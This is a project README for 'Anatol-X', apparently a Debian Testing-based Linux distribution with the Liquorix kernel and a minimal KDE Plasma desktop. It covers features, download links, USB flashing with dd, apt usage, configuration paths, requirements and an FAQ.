# Anatol-X vAlpha 2 - Linux distribution 2026

> **A streamlined, performance-oriented Linux distribution based on Debian Testing, paired with the Liquorix kernel and a pared-back KDE Plasma desktop for very low latency and smooth everyday use.**

[![Platform](https://img.shields.io/badge/Platform-Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vAlpha%202-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ben-james2005/anatolx-rolling-update?style=flat-square)](https://github.com/ben-james2005/anatolx-rolling-update)

---

<p align="center">
  <a href="https://ben-james2005.github.io/anatolx-rolling-update/">
    <img src="https://img.shields.io/badge/Download-Anatol-X%20Latest-brightgreen?style=for-the-badge" alt="Download Anatol-X">
  </a>
</p>

> **[Direct Download - Anatol-X vAlpha 2](https://ben-james2005.github.io/anatolx-rolling-update/)**

---

[Download Latest Build](https://ben-james2005.github.io/anatolx-rolling-update/)

---

## What is Anatol-X?

Anatol-X is built for users who want a lean Linux system without the usual excess found in many general-purpose desktops. It starts from Debian Testing and adds the Liquorix kernel to prioritize responsiveness across standard desktop work and heavier tasks such as gaming. The result is a system that aims to balance speed, reliability, and a clean workflow while still keeping current software available.

The distribution is aimed at power users, developers, and enthusiasts who prefer a fast-booting setup that uses resources efficiently and remains unobtrusive. Its KDE Plasma desktop is intentionally kept minimal, so the interface stays familiar but not crowded. Components are selected to keep overhead low while preserving access to the broader Debian package ecosystem.

---

## Highlights

- **Liquorix Kernel** - Included by default to improve desktop responsiveness and keep latency low
- **Debian Testing Base** - Ships with access to up-to-date packages and ongoing rolling updates
- **Debloated and Minimal** - Focuses on essentials and avoids extra preinstalled bloatware
- **Pure systemd** - Uses a straightforward system management stack without alternative init systems
- **Calamares Installer** - Provides a simple graphical install flow for beginners and advanced users alike
- **KDE Plasma Desktop** - A modern desktop environment that stays lightweight and customizable
- **Optimized for Gaming** - Includes kernel and system tuning intended to reduce input delay and support smoother frame delivery

---

## Installation

You can clone the repository or download the ISO from the link above. After that, flash the image to a USB drive with the tool of your choice:

```bash
# Using dd (replace /dev/sdX with your USB device)
sudo dd if=anatol-x-alpha-2.iso of=/dev/sdX bs=4M status=progress && sync
```

Restart the machine from the USB drive and open the Calamares installer. Then follow the prompts to choose your disk layout and finish the installation.

---

## Using the system

Once installed, Anatol-X boots straight into the KDE Plasma desktop. Common tasks include:

- **Package Management** - Manage software with APT using `sudo apt update && sudo apt install <package>`
- **System Updates** - Keep the system current with `sudo apt full-upgrade`
- **Kernel Maintenance** - Liquorix kernel updates are delivered through the standard apt repositories
- **Desktop Customization** - Open System Settings to change appearance, widgets, and keyboard shortcuts

---

## Configuration paths

System and desktop settings live in standard Linux locations:

- **Desktop Configuration** - `~/.config/` for Plasma and application settings
- **System Configuration** - `/etc/` for global system files
- **Kernel Parameters** - Edit `/etc/sysctl.d/` for performance tuning

For more advanced tuning, the Liquorix kernel exposes additional parameters under `/sys/kernel/debug/sched/`.

---

## Requirements

- **Processor** - x86-64 compatible, dual-core or better recommended
- **Memory** - 2 GB RAM minimum, 4 GB+ recommended for smooth desktop use
- **Storage** - 20 GB free disk space for base installation
- **Graphics** - Any GPU supported by the Linux kernel (NVIDIA/AMD/Intel)
- **USB Port** - For installation media (2 GB+ USB drive)

---

## FAQ

**How can I get help?**  
Open an issue in the repository or visit the community forums for help with installation and configuration.

**Does the distribution get updates regularly?**  
Yes. Because it is based on Debian Testing, updates arrive continuously. Liquorix kernel updates are provided through the Liquorix repositories.

**Can I add more desktop environments?**  
Yes. Run `sudo apt install <desktop-package>` to install other desktops such as GNOME or Xfce.

**What if the installer does not detect my hardware?**  
Make sure your system meets the minimum requirements, and try the `nomodeset` kernel parameter if you are dealing with graphics-related issues.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
